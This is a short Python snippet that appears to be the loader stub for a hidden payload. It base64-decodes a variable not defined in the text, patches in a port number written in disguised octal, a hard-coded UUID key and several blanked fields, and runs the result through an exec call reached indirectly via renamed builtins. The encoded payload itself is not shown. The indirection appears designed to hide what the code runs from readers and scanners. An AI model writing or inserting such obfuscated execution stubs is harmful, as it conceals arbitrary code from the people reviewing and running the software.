import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "f5d260e7-b8b2-4b4c-86fe-8192af7d975e")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)